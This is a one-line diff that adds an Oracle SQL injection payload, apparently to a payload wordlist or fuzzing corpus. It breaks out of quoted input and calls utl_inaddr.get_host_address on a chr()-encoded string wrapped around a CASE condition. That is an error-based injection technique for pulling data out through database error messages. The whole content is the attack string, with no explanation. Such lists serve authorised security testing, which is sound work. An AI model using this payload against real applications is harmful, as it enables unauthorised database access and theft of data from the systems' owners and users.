@@ -1,0 +1,1 @@
+1")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (("smnw" like "smnw
